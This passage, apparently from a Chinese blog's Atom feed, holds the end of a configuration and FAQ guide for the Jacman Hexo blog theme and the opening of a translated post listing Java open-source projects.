google_plus:&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  stackoverflow:&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;toc:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  article:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;## 是否在文章中显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  aside:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;     &lt;span class=&quot;comment&quot;&gt;## 是否在侧边栏显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 友情链接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;links:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  码农圈: https://coderq.com,一个面向程序员交流分享的新一代社区&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Jark&lt;span class=&quot;string&quot;&gt;&#39;s Blog: http://wuchong.me&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### 评论&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;duoshuo_shortname: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;disqus_shortname:  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### 分享按钮&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jiathis:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false   ## 默认使用主题内建分享&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  id:    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  tsina: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### 网站统计&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;google_analytics:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  id:            ## google analytics ID.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  site:          ## 网站地址.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;baidu_tongji:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sitecode:      ## 百度统计站点特征码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cnzz_tongji:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  siteid:        ## CNZZ统计站点ID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### 杂项&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ShowCustomFont: true  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fancybox: true        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;totop: true           &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### 自定义搜索&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;google_cse: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  cx:  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;baidu_search:    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  id:   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  site: http://zhannei.baidu.com/cse/search &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tinysou_search:     ## http://tinysou.com/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  enable: false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  id: &quot;4ac092ad8d749fdc6293&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;属性功能&quot;&gt;&lt;a href=&quot;#属性功能&quot; class=&quot;headerlink&quot; title=&quot;属性功能&quot;&gt;&lt;/a&gt;属性功能&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;菜单 menu&lt;/strong&gt;&lt;br&gt;默认没有启用 &lt;code&gt;/tags&lt;/code&gt; 和 &lt;code&gt;/categories&lt;/code&gt;页面，如果需要启用请在博客目录下的&lt;code&gt;source&lt;/code&gt;文件夹中分别建立&lt;code&gt;tags&lt;/code&gt; 和 &lt;code&gt;categories&lt;/code&gt;文件夹每个文件夹中分别包含一个&lt;code&gt;index.md&lt;/code&gt;文件。内容为：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;layout:&lt;/span&gt; tags (或categories)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;title:&lt;/span&gt; tags (或categories)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;因为主题中已经内置了这两个页面的模板，所以他们会被正确的解析出来。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;控件 widgets&lt;/strong&gt;&lt;br&gt;提供了7种小工具。包括标签、标签云、分类、归档、RSS、友情链接、微博秀。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;友情链接&lt;/strong&gt;：友情链接的网址添加可以在&lt;code&gt;links&lt;/code&gt;属性下添加。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;微博秀&lt;/strong&gt;：需要注意的是，如果要启用微博秀，您必须填上&lt;code&gt;author&lt;/code&gt;属性下&lt;code&gt;tsina&lt;/code&gt;和&lt;code&gt;weibo_verifier&lt;/code&gt;的值，前者是您微博ID，后者是您微博秀的验证码，访问 &lt;a href=&quot;http://app.weibo.com/tool/weiboshow&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://app.weibo.com/tool/weiboshow&lt;/a&gt; 在如下图位置，可以获得您的 verifier，如：我的是&lt;code&gt;b3593ceb&lt;/code&gt;。&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497jw1emegd6b0ytj209204pweu.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果要关闭侧边栏，将&lt;code&gt;close_aside&lt;/code&gt;置为&lt;code&gt;true&lt;/code&gt;，就会在博文页面自动关闭侧边栏。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;图片相关 Image&lt;/strong&gt;&lt;br&gt;本主题可以设置网站相关图片，例如网站图标（&lt;code&gt;favicon&lt;/code&gt;）、网站logo（&lt;code&gt;imglogo&lt;/code&gt;）、作者头像（&lt;code&gt;author_img&lt;/code&gt;）。建议启用网站logo，格式建议为&lt;code&gt;.svg&lt;/code&gt;或&lt;code&gt;.png&lt;/code&gt;格式。同时建议提供配套的 favicon 以及在苹果设备上的图标&lt;code&gt;apple_icon&lt;/code&gt;（背景不要透明）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;首页显示模式 Index&lt;/strong&gt;&lt;br&gt;目前首页的显示模式支持两种，一种是原先的卡片式（前往 &lt;a href=&quot;http://wuchong.me/jacman&quot;&gt;Demo&lt;/a&gt; 预览），另一种是类似官方主题的文章展开式（&lt;a href=&quot;http://wuchong.me&quot;&gt;本站&lt;/a&gt;即采用的这种）。两者各有优劣，前者首页加载速度更快，后者文章内容更能吸引读者。主题默认采用后一种展开式，如需开启第一种卡片式，请设置&lt;code&gt;index&lt;/code&gt;属性下的&lt;code&gt;expand: false&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;卡片式的文章摘要是截取文章内容的前140个字，也可以自己总结&lt;code&gt;description&lt;/code&gt;并将其放在开头的&lt;code&gt;front-matter&lt;/code&gt;中。展开式的文章摘要就是使用&lt;code&gt;&amp;lt;!-- more --&amp;gt;&lt;/code&gt;截取了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;作者信息 author&lt;/strong&gt;&lt;br&gt;作者信息，建议尽量填写完整。其中&lt;code&gt;tsina&lt;/code&gt;是你的新浪微博ID，不同于用户名或微博主页地址。启用这个属性后，其他用户在微博上分享你文章的同时会自动@你。同时它和&lt;code&gt;weibo_verifier&lt;/code&gt;一起作用生成微博秀。&lt;code&gt;intro_line1&lt;/code&gt;和&lt;code&gt;intro_line2&lt;/code&gt;是网站底部的个人介绍。&lt;code&gt;weibo&lt;/code&gt;、&lt;code&gt;twitter&lt;/code&gt;、&lt;code&gt;facebook&lt;/code&gt;等是用来显示网站右下角的社交按钮的，如下图所示。&lt;br&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1emgscr3575j2078050jrc.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;目录 toc&lt;/strong&gt;&lt;br&gt;是否启用在文章中或侧边栏中的目录功能。二者可以都为&lt;code&gt;true&lt;/code&gt;或都为&lt;code&gt;false&lt;/code&gt;。同时，如果你希望在特定的某一篇文章中关闭目录功能你可以在文章文件开头中的&lt;code&gt;front-matter&lt;/code&gt;中加上一行&lt;code&gt;toc: false&lt;/code&gt;。如果希望在某一篇文章中关闭目录自动编号功能你可以在文章文件开头的&lt;code&gt;front-matter&lt;/code&gt;中加上一行&lt;code&gt;list_number: false&lt;/code&gt;。另外 hexo 2.5.2 开始支持中文目录，想获得更好的体验请升级你的 Hexo 版本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;评论 comments&lt;/strong&gt;&lt;br&gt;填写&lt;code&gt;duoshuo_shortname&lt;/code&gt;&lt;a href=&quot;http://duoshuo.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;多说&lt;/a&gt;的用户名，启用多说评论系统。在大陆地区更好用的评论系统。&lt;/p&gt;
&lt;p&gt;填写&lt;code&gt;disqus_shortname&lt;/code&gt;&lt;a href=&quot;http://disqus.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;disqus&lt;/a&gt; 的用户名，启用 disqus 评论系统。国际上更广泛使用的评论系统。设置博客根目录下的&lt;code&gt;_config.yml&lt;/code&gt;文件中的&lt;code&gt;disqus_shortname&lt;/code&gt;同样也能开启该功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;加网分享 jiathis&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;http://www.jiathis.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;加网&lt;/a&gt;分享系统。默认关闭，因为主题已经内置了原生的分享功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;网站统计 Analytics&lt;/strong&gt;&lt;br&gt;&lt;code&gt;google_analytics&lt;/code&gt;：Google Analytics追踪代码。请注意：Google Analytics已经升级到了Universal Analytics。请先前往后台升级你的Google Analytics版本后再启用追踪代码，更多信息请&lt;a href=&quot;https://developers.google.com/analytics/devguides/collection/upgrade/?hl=zh_CN&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;点击这里&lt;/a&gt;了解。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;baidu_tongji&lt;/code&gt;：百度统计功能。需要填写站点特征码&lt;code&gt;sitecode&lt;/code&gt;，在&lt;a href=&quot;http://tongji.baidu.com/web/welcome/login&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官网&lt;/a&gt;注册并配置站点后，获取特征码。特征码可以在「网站中心」-&amp;gt; 「代码获取」中查看，如下图所示的&lt;code&gt;e6d1f421bbc9962127a50488f9ed37d1&lt;/code&gt;，注意去掉前面的&lt;code&gt;3F&lt;/code&gt;。&lt;br&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1emf4v6qf91j20kf07sq8v.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cnzz_tongji&lt;/code&gt;：站长统计功能。需要填写站点ID&lt;code&gt;siteid&lt;/code&gt;，同理在&lt;a href=&quot;http://www.cnzz.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;站长官网&lt;/a&gt;注册并配置站点后获得。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;数学公式 mathjax&lt;/strong&gt;&lt;br&gt;主题支持写 LaTex 数学公式。只需要在文章文件开头的&lt;code&gt;front-matter&lt;/code&gt;中，加上一行&lt;code&gt;mathjax: true&lt;/code&gt;，即可在文中写 LaTex 公式。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;图片浏览 fancybox&lt;/strong&gt;&lt;br&gt;默认关闭，如果你使用 Hexo 经常发表 Gallery 类型的文章，那么请设置为&lt;code&gt;true&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;返回顶部 totop&lt;/strong&gt;&lt;br&gt;右下角&lt;code&gt;返回顶部&lt;/code&gt;按钮，默认开启。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;自定义字体 ShowCustomFont&lt;/strong&gt;&lt;br&gt;是否启用自定义字体，默认开启，主要用于显示网站底部的字体。如果你有一定前端基础可以修改 font.styl 替换为你喜欢的字体。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;自定义搜索 Search&lt;/strong&gt;&lt;br&gt;&lt;code&gt;baidu_search&lt;/code&gt;：如果开启百度站内搜索需要登录 &lt;a href=&quot;http://zn.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度站内搜索&lt;/a&gt;，配置好你的站点，并开启站内搜索获取搜索ID，另外&lt;code&gt;site&lt;/code&gt;属性可以填默认值，也可以填自己做了CNAME的二级域名，更详细的可以阅读&lt;a href=&quot;http://gengbiao.me/hexo/hexo%E6%B7%BB%E5%8A%A0%E7%99%BE%E5%BA%A6%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇博客&lt;/a&gt;了解。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;google_cse&lt;/code&gt;：如果开启谷歌自定义搜索需要先登录 &lt;a href=&quot;https://www.google.com/cse/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Google CSE&lt;/a&gt;，配置好你的站点，并获得此自定义搜索的ID。此外你需要在博客目录下的&lt;code&gt;source&lt;/code&gt;文件夹中建立&lt;code&gt;search&lt;/code&gt;文件夹并包含一个&lt;code&gt;index.md&lt;/code&gt;文件。内容为：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;layout:&lt;/span&gt; search&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;title:&lt;/span&gt; search&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;tiny_search&lt;/code&gt;: 如果要开启&lt;a href=&quot;http://tinysou.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;微搜索&lt;/a&gt;，需要先注册一个帐号，配置一个Engine，将Engine的Key填入配置文件中的&lt;code&gt;id&lt;/code&gt;即可。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;主题颜色更改 Theme Color&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目前官方还未支持十六进制颜色与String值的转换，所以需要手动添加依赖包，该问题估计不久后会解决。&lt;/p&gt;
&lt;figure class=&quot;highlight autoit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;## 在博客的目录下输入下面指令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd node_modules/hexo-renderer-stylus &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo npm install stylus&lt;span class=&quot;symbol&quot;&gt;@0&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.49&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.2&lt;/span&gt;  &lt;span class=&quot;meta&quot;&gt;#根据系统文件的权限不同，有的不需要加sudo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后更改在主题目录下的&lt;code&gt;_config.yml&lt;/code&gt;的 &lt;code&gt;theme_color&lt;/code&gt; 下 &lt;code&gt;theme&lt;/code&gt; 值。&lt;br&gt;&lt;figure class=&quot;highlight xl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;### Theme Color &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;theme_color:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;theme&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;#2ca6cb&#39;&lt;/span&gt;    ##the defaut &lt;span class=&quot;built_in&quot;&gt;theme&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;color&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; blue&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;常见问题&quot;&gt;&lt;a href=&quot;#常见问题&quot; class=&quot;headerlink&quot; title=&quot;常见问题&quot;&gt;&lt;/a&gt;常见问题&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：图片默认都是居左的，我怎么设置能让图片居中呢？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 &lt;code&gt;&amp;lt;img src=&amp;quot;&amp;quot; style=&amp;quot;display:block;margin:auto&amp;quot;/&amp;gt;&lt;/code&gt;的HTML标签。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：如何建立一篇图片类文章（Gallery Post）？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用&lt;code&gt;hexo new photo &amp;quot;your titile&amp;quot;&lt;/code&gt;建立图片类文章，或者直接新建一个 Markdown 文件，将其&lt;code&gt;front-matter&lt;/code&gt;修改为如下，即可看到主题为图片类文章提供的样式，&lt;a href=&quot;http://wuchong.me/jacman/gallery&quot;&gt;Demo&lt;/a&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;layout:&lt;/span&gt; photo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;title:&lt;/span&gt; Gallery Post&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;photos:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;- http:&lt;/span&gt;//i.minus.com/ibobbTlfxZgITW.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;- http:&lt;/span&gt;//i.minus.com/iedpg90Y0exFS.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：我在配置文件中给某一项设置了值，但为什么总是看不到效果啊？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;_config.yml&lt;/code&gt;文件中的每个属性值前面必须留一个空格，建议在 Sublime/Notepad++ 中开启显示所有空格模式。另每篇文章的 &lt;code&gt;front-matter&lt;/code&gt; 也要注意这个问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：如何建立自我介绍页面（About 页面）？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;首先在主目录找到&lt;code&gt;_config.yml&lt;/code&gt;，找到url添加&lt;code&gt;about_dir: about&lt;/code&gt;到这个板块。然后在&lt;code&gt;/source&lt;/code&gt;里面建立about文件夹。在about文件夹里建立index.md。编辑index.md就和发布其他的文章一样，格式都一样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：怎么提意见和建议？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主题还在不断完善中，欢迎 &lt;a href=&quot;https://github.com/wuchong/jacman/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;open issue&lt;/a&gt; 来提建议，参与讨论。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：楼主我不喜欢你的配色，怎么换主题的颜色呢？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;包括颜色在内的很多变量都在&lt;code&gt;jacman/source/css/_base/variable.styl&lt;/code&gt;文件中，可以修改成你喜欢的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：英语更能突显我的逼格，怎么换成英语？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;配置你的博客根目录下的&lt;code&gt;_config.yml&lt;/code&gt;，去掉&lt;code&gt;language: zh-CN&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：为什么我修改了配置文件/发表了博文，解析出来的却是乱码呢？ &lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;请将你的配置文件/markdown文件保存成 &lt;code&gt;UTF-8&lt;/code&gt; 格式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：为什么开启了微博秀后，显示是空白的，没有内容展示？ &lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;每次修改参数都会这样，需要多刷新几次或者上传到服务器上就好了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Q：博主 Jacman Demo 站点中文章的 md 源文件在哪能看到呢？ &lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我将 Demo 站点所有源文件放在了 Jacman 的 &lt;a href=&quot;https://github.com/wuchong/jacman/tree/site&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;site&lt;/a&gt; 分支下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;PS:有任何关于 Hexo 的问题，欢迎来 &lt;a href=&quot;https://coderq.com/c/tech/hexo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo 中文社区&lt;/a&gt; 咨询。&lt;/em&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      Jacman 是一款扁平化，有着响应式设计的 Hexo 主题。本站正式使用了 Jacman 主题。Jacman 基于 Pacman 主题修改而来，而今已有很多特性与原主题不同。你可以前往本站和 Demo 预览更多关于本主题的更多效果。如果你有任何问题或意见欢迎到 GitHub 发表 issue。
    
    </summary>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Jacman" scheme="http://wuchong.me/tags/Jacman/"/>
    
  </entry>
  
  <entry>
    <title>【译】10个你能参与并学习的Java开源项目</title>
    <link href="http://wuchong.me/blog/2014/10/31/10-interesting-java-projects-you-can-contribute-and-learn/"/>
    <id>http://wuchong.me/blog/2014/10/31/10-interesting-java-projects-you-can-contribute-and-learn/</id>
    <published>2014-10-31T15:09:18.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    
    <content type="html">&lt;p&gt;【本文翻译自 Javapapers ,原文链接：&lt;a href=&quot;http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/&lt;/a&gt;】&lt;/p&gt;
&lt;p&gt;如果你正在寻找有趣的 Java 项目去参与和贡献，那么请继续阅读这篇文章。这篇博文是 Java 画廊（Java Gallery）中的一部分，在Java画廊栏目下我介绍了一些有趣的Java项目给我们的读者。成为 Java 开发团队中的一员并编写大量代码是一件很棒的事情。&lt;/p&gt;
&lt;p&gt;在学校里我们也许没有机会接触到真正的开发环境。在企业里我们可能做不了最喜欢的项目。在这种情况下，让我们加入可以带给我们欢乐和兴趣的开源项目吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1eluqwemss2j20go0bpgo8.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有很多备受关注的初创开源项目，下面列出十个项目是我觉得非常有趣的，涉及到的学习范围也很广。其中有些还在早期阶段，这对我们来说更好。看一看这些项目，选择一个你喜欢的，然后给它的领导者发一封邮件并参加到开发中去。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/codeka/wwmmo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;War Worlds&lt;/a&gt; – 基于策略的游戏 – Java 服务端和 Android 客户端。&lt;/li&gt;
